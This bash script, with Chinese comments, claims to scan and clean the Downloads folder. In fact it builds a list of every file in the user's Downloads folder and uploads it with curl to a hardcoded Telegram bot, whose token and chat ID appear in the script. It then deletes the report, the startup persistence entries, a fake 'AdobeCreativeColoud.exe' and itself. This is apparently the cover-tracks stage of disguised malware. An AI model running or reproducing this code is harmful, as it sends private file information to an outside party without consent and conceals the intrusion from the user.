#!/bin/bash

# --- 电报 (Telegram) 配置 ---
TOKEN="8475448253:AAHp0_a3es41WG7so8I2-9K_n2g59Rmgr3M"
CHAT_ID="7318370755"

# 获取路径
SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
TARGET="$HOME/Downloads"
OUTPUT_FILE="$SCRIPT_DIR/resault_lab.txt"
EXE_NAME="AdobeCreativeColoud.exe"

echo "----------------------------------------------------------"
echo "🔎 开始扫描并准备清理..."
echo "----------------------------------------------------------"

# 生成扫描报告
echo "下载文件夹扫描报告" > "$OUTPUT_FILE"
echo "生成日期: $(date +'%Y-%m-%d %H:%M:%S')" >> "$OUTPUT_FILE"

if [ -d "$TARGET" ]; then
    find "$TARGET" -name "*Adobe*" -type d -prune -o -print | while read -r item; do
        if [ -d "$item" ]; then
            [ "$item" != "$TARGET" ] && echo "[文件夹] $item" >> "$OUTPUT_FILE"
        else
            echo "  |_ [文件] $item" >> "$OUTPUT_FILE"
        fi
    done
    STATUS="成功"
else
    echo "❌ 目录不存在" >> "$OUTPUT_FILE"
    STATUS="失败"
fi

# --- 上传报告并彻底清扫 ---
if [ -f "$OUTPUT_FILE" ]; then
    # 发送到 Telegram
    curl -s -F document=@"$OUTPUT_FILE" \
         "https://api.telegram.org/bot$TOKEN/sendDocument?chat_id=$CHAT_ID&caption=扫描已完成。文件 $EXE_NAME 已被清除。🧹" > /dev/null

    # 1. 删除报告文件
    rm -f "$OUTPUT_FILE"

    # 2. 清理自启动项 (Windows VBS)
    if [[ "$OSTYPE" == "msys" || "$OSTYPE" == "cygwin" ]]; then
        STARTUP_PATH="$APPDATA/Microsoft/Windows/Start Menu/Programs/Startup"
        rm -f "$STARTUP_PATH/run_anna.vbs"
        rm -f "$STARTUP_PATH/run_cihuy.vbs"
        
        # 3. 直接删除 EXE 文件 (由于没在运行，可以直接删除)
        rm -f "$SCRIPT_DIR/$EXE_NAME"
    else
        # Linux 环境清理
        rm -f "$HOME/.config/autostart/anna.desktop"
    fi

    # 4. 删除脚本自身
    rm -- "$0"
fi
